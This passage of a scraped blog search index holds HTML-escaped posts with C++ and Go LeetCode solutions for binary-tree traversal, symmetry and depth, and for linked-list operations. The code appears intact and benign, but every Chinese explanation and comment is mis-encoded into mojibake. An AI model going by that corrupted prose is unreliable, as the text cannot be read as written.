        reverse(result.begin(), result.end()); // å°†ç»“æœåè½¬ä¹‹åå°±æ˜¯å·¦å³ä¸­çš„é¡ºåºäº†
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æ ‘çš„å±‚æ¬¡éå†&#34;&gt;äºŒå‰æ ‘çš„å±‚æ¬¡éå†&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; levelOrder(TreeNode* root) {
        queue&amp;lt;TreeNode*&amp;gt; que;
        if (root != NULL) que.push(root);
        vector&amp;lt;vector&amp;lt;int&amp;gt;&amp;gt; result;
        while (!que.empty()) {
            int size = que.size();
            vector&amp;lt;int&amp;gt; vec;
            // è¿™é‡Œä¸€å®šè¦ä½¿ç”¨å›ºå®šå¤§å°sizeï¼Œä¸è¦ä½¿ç”¨que.size()ï¼Œå› ä¸ºque.sizeæ˜¯ä¸æ–­å˜åŒ–çš„
            for (int i = 0; i &amp;lt; size; i++) {
                TreeNode* node = que.front();
                que.pop();
                vec.push_back(node-&amp;gt;val);
                if (node-&amp;gt;left) que.push(node-&amp;gt;left);
                if (node-&amp;gt;right) que.push(node-&amp;gt;right);
            }
            result.push_back(vec);
        }
        return result;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åè½¬äºŒå‰æ ‘&#34;&gt;åè½¬äºŒå‰æ ‘&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/invert-binary-tree/&lt;/p&gt;
&lt;p&gt;æŠŠæ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³å­©å­è°ƒæ¢é¡ºåºå°±è¡Œäº†ï¼Œå‰åºéå†å’Œååºéå†éƒ½å¯ä»¥ï¼Œä½†æ˜¯ä¸­åºéå†ä¸è¡Œï¼Œå› ä¸ºä¸­åºéå†çš„ç‰¹æ€§ä¼šä½¿æœ‰çš„èŠ‚ç‚¹çš„å·¦å³å­©å­è°ƒæ¢ä¸¤æ¬¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    TreeNode* invertTree(TreeNode* root) {
        if(!root) return root;
        TreeNode *tmp = root-&amp;gt;left;
        root-&amp;gt;left = root-&amp;gt;right;
        root-&amp;gt;right = tmp;
        if(root-&amp;gt;left) invertTree(root-&amp;gt;left);
        if(root-&amp;gt;right)  invertTree(root-&amp;gt;right);
        return root;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¯¹ç§°äºŒå‰æ ‘&#34;&gt;å¯¹ç§°äºŒå‰æ ‘â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/symmetric-tree/submissions/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜ä¸€å¼€å§‹æˆ‘æƒ³çš„æ˜¯ç›´æ¥å±‚æ¬¡éå†ï¼Œçœ‹çœ‹æ¯å±‚çš„æ•°å€¼æ˜¯ä¸æ˜¯â€œå›æ–‡â€ï¼Œåæ¥å‘ç°æ˜¯â€œå›æ–‡â€æ˜¯å¯¹ç§°äºŒå‰æ ‘çš„å¿…è¦ä¸å……åˆ†æ¡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜éœ€è¦æ¯”è¾ƒæ ¹èŠ‚ç‚¹çš„ä¸¤ä¸ªå­æ ‘çš„æ˜¯ä¸æ˜¯å¯¹ç§°çš„ï¼Œå¯¹äºå·¦å­æ ‘æ¥è¯´éå†é¡ºåºå¯ä»¥æ˜¯å·¦å³ä¸­ï¼Œé‚£ä¹ˆå¯¹äºå³å­æ ‘æ¥è¯´éå†é¡ºåºæ˜¯å³å·¦ä¸­ï¼Œå…¶å®ä¸ç®—æ˜¯ä¸¥æ ¼çš„ååºéå†ã€‚&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;      1
     / \
    2   2
   / \ / \
  3  4 4  3
 / \     / \
5   6   6   5  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å·¦å­æ ‘çš„å·¦å³ä¸­é¡ºåºéå†ï¼š56342&lt;/p&gt;
&lt;p&gt;å³å­æ ‘çš„å³å·¦ä¸­é¡ºåºéå†ï¼š56342&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥å¯ä»¥ç”¨ä¸¤ä¸ªæ•°ç»„ï¼Œåˆ†åˆ«å°†å·¦å³å­æ ‘çš„æŒ‰ç…§åˆšæ‰è¯´çš„éå†é¡ºåºè®°å½•ä¸‹æ¥ï¼Œç„¶åå¯¹æ¯”æ˜¯ä¸æ˜¯ä¸€æ ·ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;int&amp;gt; left;
    vector&amp;lt;int&amp;gt; right;
    bool isSymmetric(TreeNode* root) {
        leftRightIn(root-&amp;gt;left);
        rightLeftIn(root-&amp;gt;right);
        if (left.size() != right.size()) {
            return false;
        }
        for (int i = 0; i &amp;lt; left.size(); i++ ){
            // cout &amp;lt;&amp;lt; left[i] &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; right[i] &amp;lt;&amp;lt; endl;
            if (left[i] != right[i]) {
                return false;
            }
        }
        return true;
    }

    void leftRightIn(TreeNode* root) { // å·¦å³ä¸­
        if (root == NULL) {
            left.push_back(-1);
            return ;
        }
        leftRightIn(root-&amp;gt;left);
        leftRightIn(root-&amp;gt;right);
        left.push_back(root-&amp;gt;val);
    }

    void rightLeftIn(TreeNode* root) { // å³å·¦ä¸­
        if (root == NULL) {
            right.push_back(-1);
            return ;
        }
        rightLeftIn(root-&amp;gt;right);
        rightLeftIn(root-&amp;gt;left);
        right.push_back(root-&amp;gt;val);
    }

};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿˜æœ‰ä¸€ç§å°±æ˜¯ç›´æ¥æ‰¾åˆ°ä¸è¯¥èŠ‚ç‚¹å¯¹ç§°çš„èŠ‚ç‚¹ï¼Œæ¯”è¾ƒä¸¤ä¸ªèŠ‚ç‚¹çš„å€¼ä»¥åŠä»–ä»¬å­æ ‘çš„å€¼ï¼Œå°±ä¸ç”¨å»ºç«‹æ•°ç»„è®°å½•è®¿é—®é¡ºåºäº†ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool compare(TreeNode* left, TreeNode* right) {
        // é¦–å…ˆæ’é™¤ç©ºèŠ‚ç‚¹çš„æƒ…å†µ
        if (left == NULL &amp;amp;&amp;amp; right != NULL) return false;
        else if (left != NULL &amp;amp;&amp;amp; right == NULL) return false;
        else if (left == NULL &amp;amp;&amp;amp; right == NULL) return true;
        // æ’é™¤äº†ç©ºèŠ‚ç‚¹ï¼Œå†æ’é™¤æ•°å€¼ä¸ç›¸åŒçš„æƒ…å†µ
        else if (left-&amp;gt;val != right-&amp;gt;val) return false;

        // æ­¤æ—¶å°±æ˜¯ï¼šå·¦å³èŠ‚ç‚¹éƒ½ä¸ä¸ºç©ºï¼Œä¸”æ•°å€¼ç›¸åŒçš„æƒ…å†µ
        // æ­¤æ—¶æ‰åšé€’å½’ï¼Œåšä¸‹ä¸€å±‚çš„åˆ¤æ–­
        bool outside = compare(left-&amp;gt;left, right-&amp;gt;right);   // æ¯”è¾ƒå·¦å­æ ‘çš„å·¦å­æ ‘å’Œå³å­æ ‘çš„å³å­æ ‘
        bool inside = compare(left-&amp;gt;right, right-&amp;gt;left);    // æ¯”è¾ƒå·¦å­æ ‘çš„å³å­æ ‘å’Œå³å­æ ‘çš„å·¦å­æ ‘
        bool isSame = outside &amp;amp;&amp;amp; inside; 
        return isSame;

    }
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        return compare(root-&amp;gt;left, root-&amp;gt;right);
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿­ä»£æ³•å¯ä»¥ç”¨é˜Ÿåˆ—ï¼Œä½†æ˜¯æ³¨æ„ä¸æ˜¯å±‚æ¬¡è®¿é—®ï¼Œæ¯æ¬¡å°†å·¦-&amp;gt;å·¦ã€å³-&amp;gt;å³ã€å·¦-&amp;gt;å³ï¼Œå³-&amp;gt;å·¦åŠ å…¥é˜Ÿåˆ—ï¼Œæ¯æ¬¡å–å‡ºä¸€å¯¹è¿›è¡Œæ¯”è¾ƒï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        queue&amp;lt;TreeNode*&amp;gt; que;
        que.push(root-&amp;gt;left);   // å°†å·¦å­æ ‘å¤´ç»“ç‚¹åŠ å…¥é˜Ÿåˆ—
        que.push(root-&amp;gt;right);  // å°†å³å­æ ‘å¤´ç»“ç‚¹åŠ å…¥é˜Ÿåˆ—
        
        while (!que.empty()) {  // æ¥ä¸‹æ¥å°±è¦åˆ¤æ–­è¿™ä¸¤ä¸ªæ ‘æ˜¯å¦ç›¸äº’ç¿»è½¬
            TreeNode* leftNode = que.front(); que.pop();
            TreeNode* rightNode = que.front(); que.pop();
            if (!leftNode &amp;amp;&amp;amp; !rightNode) {  // å·¦èŠ‚ç‚¹ä¸ºç©ºã€å³èŠ‚ç‚¹ä¸ºç©ºï¼Œæ­¤æ—¶è¯´æ˜æ˜¯å¯¹ç§°çš„
                continue;
            }

            // å·¦å³ä¸€ä¸ªèŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œæˆ–è€…éƒ½ä¸ä¸ºç©ºä½†æ•°å€¼ä¸ç›¸åŒï¼Œè¿”å›false
            if ((!leftNode || !rightNode || (leftNode-&amp;gt;val != rightNode-&amp;gt;val))) {
                return false;
            }
            que.push(leftNode-&amp;gt;left);   // åŠ å…¥å·¦èŠ‚ç‚¹å·¦å­©å­
            que.push(rightNode-&amp;gt;right); // åŠ å…¥å³èŠ‚ç‚¹å³å­©å­
            que.push(leftNode-&amp;gt;right);  // åŠ å…¥å·¦èŠ‚ç‚¹å³å­©å­
            que.push(rightNode-&amp;gt;left);  // åŠ å…¥å³èŠ‚ç‚¹å·¦å­©å­
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”±äºé˜Ÿåˆ—æ¯æ¬¡åªæ˜¯å­˜å‚¨æ¯ä¸€å±‚çš„èŠ‚ç‚¹ï¼Œä¸”æ¯æ¬¡ä»é˜Ÿåˆ—ä¸­å–å‡ºçš„èŠ‚ç‚¹æ˜¯ä¸€å¯¹ï¼Œå¯¹ä¸å¯¹ä¹‹é—´çš„é¡ºåºä¸ç”¨ä¸¥æ ¼æ§åˆ¶ï¼Œæ‰€ä»¥å¯ä»¥æŠŠé˜Ÿåˆ—ç›´æ¥æ›¿æ¢æˆæ ˆä¹Ÿè¡Œã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isSymmetric(TreeNode* root) {
        if (root == NULL) return true;
        stack&amp;lt;TreeNode*&amp;gt; st; // è¿™é‡Œæ”¹æˆäº†æ ˆ
        st.push(root-&amp;gt;left);
        st.push(root-&amp;gt;right);
        while (!st.empty()) {
            TreeNode* leftNode = st.top(); st.pop();
            TreeNode* rightNode = st.top(); st.pop();
            if (!leftNode &amp;amp;&amp;amp; !rightNode) {
                continue;
            }
            if ((!leftNode || !rightNode || (leftNode-&amp;gt;val != rightNode-&amp;gt;val))) {
                return false;
            }
            st.push(leftNode-&amp;gt;left);
            st.push(rightNode-&amp;gt;right);
            st.push(leftNode-&amp;gt;right);
            st.push(rightNode-&amp;gt;left);
        }
        return true;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦&#34;&gt;äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/&lt;/p&gt;
&lt;p&gt;é€’å½’æ³•å¾ˆç®€å•&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int res = 0;
    int maxDepth(TreeNode* root) {
        if (root == NULL) return 0;
        getdepth(root, 1);
        return res;
    }

    void getdepth(TreeNode* root, int k) {
        if (res &amp;lt; k) res = k;
        if (root-&amp;gt;left) getdepth(root-&amp;gt;left, k + 1);
        if (root-&amp;gt;right) getdepth(root-&amp;gt;right, k + 1);
    }

};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœè¦æ˜¯è¿­ä»£æ³•å°±æ˜¯ä½¿ç”¨å±‚æ¬¡éå†ï¼Œè®¡ç®—ä»¥ä¸‹æœ‰å¤šå°‘å±‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int maxDepth(TreeNode* root) {
        if (root == NULL) return 0;
        int res = 0;
        queue&amp;lt;TreeNode*&amp;gt; q;
        q.push(root);

        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i++ ) {
                TreeNode* node = q.front();
                q.pop();
                if (node-&amp;gt;left) q.push(node-&amp;gt;left);
                if (node-&amp;gt;right) q.push(node-&amp;gt;right);
            }
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¤šå‰æ ‘çš„æ·±åº¦&#34;&gt;å¤šå‰æ ‘çš„æ·±åº¦&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/maximum-depth-of-n-ary-tree/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int maxDepth(Node* root) {
        if (!root) return 0;
        int res = 0;
        queue&amp;lt;Node*&amp;gt; q;
        q.push(root);
        
        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i ++) {
                Node* node = q.front();
                q.pop();
                for (int j = 0; j &amp;lt; node-&amp;gt;children.size(); j++ ) {
                    q.push(node-&amp;gt;children[j]);
                }
            } 
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æ ‘çš„æœ€å°æ·±åº¦&#34;&gt;äºŒå‰æ ‘çš„æœ€å°æ·±åº¦&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/minimum-depth-of-binary-tree/&lt;/p&gt;
&lt;p&gt;ç”¨å±‚æ¬¡éå†ï¼Œå½“é‡åˆ°å·¦å³å­©å­éƒ½ä¸ºç©ºçš„èŠ‚ç‚¹(å¶å­èŠ‚ç‚¹)æ—¶å°±è¿”å›ï¼Œ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    int minDepth(TreeNode* root) {
        if (!root) return 0;
        int res = 0;
        queue&amp;lt;TreeNode*&amp;gt; q;
        q.push(root);

        while (!q.empty()) {
            res ++;
            int len = q.size();
            for (int i = 0; i &amp;lt; len; i++) {
                TreeNode* node = q.front();
                q.pop();
                if (!node-&amp;gt;left &amp;amp;&amp;amp; !node-&amp;gt;right) return res;
                if (node-&amp;gt;left) q.push(node-&amp;gt;left);
                if (node-&amp;gt;right) q.push(node-&amp;gt;right);
            }
            
        }
        return res;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„&#34;&gt;äºŒå‰æ ‘çš„æ‰€æœ‰è·¯å¾„&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/binary-tree-paths/&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å°±æ˜¯ä¸€é“å›æº¯é¢˜ï¼Œé€’å½’çš„å‡ºå£å°±æ˜¯é‡åˆ°å¶å­èŠ‚ç‚¹ï¼Œéº»çƒ¦çš„ä¸€ç‚¹å°±æ˜¯æ•´æ•°è½¬å­—ç¬¦ä¸²ï¼ŒC++ä¸èƒ½ç›´æ¥è½¬&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    vector&amp;lt;string&amp;gt; res;
    vector&amp;lt;string&amp;gt; binaryTreePaths(TreeNode* root) {
        string path = &amp;quot;&amp;quot;;
        backtracking(root, path);
        return res;
    }

    void backtracking(TreeNode* root, string path) {
        if (!root-&amp;gt;left &amp;amp;&amp;amp; !root-&amp;gt;right) {
            if (path != &amp;quot;&amp;quot;) path += &amp;quot;-&amp;gt;&amp;quot;;
            path += intToString(root-&amp;gt;val);
            res.push_back(path);
            return ;
        }
        
        if (path != &amp;quot;&amp;quot;) path += &amp;quot;-&amp;gt;&amp;quot;; 

        if (root-&amp;gt;left) backtracking(root-&amp;gt;left, path + intToString(root-&amp;gt;val));
        if (root-&amp;gt;right) backtracking(root-&amp;gt;right, path + intToString(root-&amp;gt;val));
    }

    string intToString(int x) {
        if (x == 0)  return &amp;quot;0&amp;quot;;
        string str = &amp;quot;&amp;quot;;
        bool negative = 0;
        if (x &amp;lt; 0) {
            negative = 1;
            x = -x;
        }
        while (x != 0) {
            string tmp = &amp;quot;&amp;quot;;
            tmp += x % 10 + &#39;0&#39;;
            str = tmp + str;
            x /= 10;
        }
        if (negative) 
        	return &amp;quot;-&amp;quot; + str;
        return str;
    }
};
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;å¹³è¡¡äºŒå‰æ ‘&#34;&gt;å¹³è¡¡äºŒå‰æ ‘&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/balanced-binary-tree/&lt;/p&gt;
&lt;p&gt;è¦ä¿è¯æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½æ˜¯å¹³è¡¡äºŒå‰æ ‘ï¼Œæ‰€ä»¥æ¯å±‚é€’å½’éƒ½è¦è¿”å›è¯¥èŠ‚ç‚¹çš„é«˜åº¦ï¼Œè®©ä¸Šä¸€å±‚é€’å½’å»åˆ¤æ–­å·¦å³å­æ ‘çš„é«˜åº¦å·®ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;class Solution {
public:
    bool isBalanced(TreeNode* root) {
        if (!root) return true;
        return level(root) != -1;
    }

    int level(TreeNode* root) {
        if(!root) return 0;
        int left = level(root-&amp;gt;left);
        if (left == -1) return -1;
        int right = level(root-&amp;gt;right);
        if (right == -1) return -1;
        return abs(left - right) &amp;gt; 1 ? -1 : max(left, right) + 1;
    }
};
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘æ ‘</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/suan-fa-lian-biao/"" data-c="
          &lt;h3 id=&#34;ç§»é™¤é“¾è¡¨å…ƒç´ &#34;&gt;ç§»é™¤é“¾è¡¨å…ƒç´ &lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-linked-list-elements/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeElements(head *ListNode, val int) *ListNode {

    for head != nil &amp;amp;&amp;amp; head.Val == val {
        head = head.Next
    }

    p := head

    for p != nil &amp;amp;&amp;amp; p.Next != nil {
        if p.Next.Val == val {
            p.Next = p.Next.Next
        } else {
            p = p.Next
        }
    }

    return head
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;è®¾è®¡é“¾è¡¨&#34;&gt;è®¾è®¡é“¾è¡¨&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/design-linked-list/&lt;/p&gt;
&lt;p&gt;å¥½å®¶ä¼™ï¼&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type MyLinkedList struct {
    Val int
    Next *MyLinkedList
}


func Constructor() MyLinkedList {
    return MyLinkedList{
        Val : 0,
        Next : nil,
    }
}

func (this *MyLinkedList) GetLen() int {
    len := 0
    for this != nil {
        len ++
        this = this.Next
    }
    return len - 1 // å»æ‰å¤´èŠ‚ç‚¹
}


func (this *MyLinkedList) Get(index int) int {
    i := -1 // -1å½“ä½œæ˜¯å¤´èŠ‚ç‚¹çš„ä¸‹æ ‡
    for i != index &amp;amp;&amp;amp; this != nil {
        i ++
        this = this.Next
    }
    if i == index &amp;amp;&amp;amp; this != nil {
        return this.Val
    }
    return -1
}


func (this *MyLinkedList) AddAtHead(val int)  {
    head := &amp;amp;MyLinkedList {
        Val : val,
        Next : this.Next,
    }
    this.Next = head
}


func (this *MyLinkedList) AddAtTail(val int)  {
    tail := &amp;amp;MyLinkedList {
        Val : val,
        Next : nil,
    }
    for this.Next != nil {
        this = this.Next
    }
    this.Next = tail
}


func (this *MyLinkedList) AddAtIndex(index int, val int)  {
    if index &amp;lt; 0 {
        this.AddAtHead(val)
    } else if index == this.GetLen() {
        this.AddAtTail(val)
    } else if index &amp;lt; this.GetLen() {
        i := -1
        for i != index - 1 {
            i ++
            this = this.Next
        }
        tmp := &amp;amp;MyLinkedList {
                Val : val,
                Next : this.Next,
            }
        this.Next = tmp
    }

}


func (this *MyLinkedList) DeleteAtIndex(index int)  {
    if index &amp;gt;= this.GetLen() {
        return 
    }
    i := -1
    for i != index - 1 {
        i++
        this = this.Next
    }
    this.Next = this.Next.Next
}


/**
 * Your MyLinkedList object will be instantiated and called as such:
 * obj := Constructor();
 * param_1 := obj.Get(index);
 * obj.AddAtHead(val);
 * obj.AddAtTail(val);
 * obj.AddAtIndex(index,val);
 * obj.DeleteAtIndex(index);
 */
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åè½¬é“¾è¡¨&#34;&gt;åè½¬é“¾è¡¨&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/reverse-linked-list/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func reverseList(head *ListNode) *ListNode {
    if head == nil || head.Next == nil {
        return head
    }
    pre := head
    current := head.Next
    pre.Next = nil
    for current != nil {
        tmp := current.Next
        current.Next = pre
        pre = current
        current = tmp
    }
    return pre
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹&#34;&gt;ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/swap-nodes-in-pairs/&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func swapPairs(head *ListNode) *ListNode {

    if head == nil || head.Next == nil {
        return head
    }

    ans := head.Next
    var pre *ListNode

    for head != nil &amp;amp;&amp;amp; head.Next != nil {
        if pre != nil {
            pre.Next = head.Next
        }
        pre = head
        head = head.Next
        tmp := head.Next
        head.Next = pre
        pre.Next = tmp
        head = tmp
    }

    return ans
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;ç¯å½¢é“¾è¡¨ii&#34;&gt;ç¯å½¢é“¾è¡¨â…¡â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/linked-list-cycle-ii/&lt;/p&gt;
&lt;p&gt;è®¾ç½®å¿«æ…¢æŒ‡é’ˆï¼Œå¿«æŒ‡é’ˆä¸€æ¬¡èµ°ä¸¤æ­¥ï¼Œæ…¢æŒ‡é’ˆä¸€æ¬¡èµ°ä¸€æ­¥ï¼ŒäºŒè€…ç›¸é‡æ—¶ä¸€å®šæ˜¯åœ¨ç¯å†…ï¼Œå‡è®¾å¤´èŠ‚ç‚¹åˆ°ç¯çš„å…¥å£è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå…¥å£åˆ°å¿«æ…¢æŒ‡é’ˆç›¸é‡çš„ä½ç½®è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œä»ç›¸é‡ä½ç½®åˆ°ç¯å…¥å£ä½ç½®è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684334727.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç›¸é‡æ—¶ï¼Œæ…¢æŒ‡é’ˆèµ°è¿‡çš„è·ç¦»ä¸ºï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.625em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
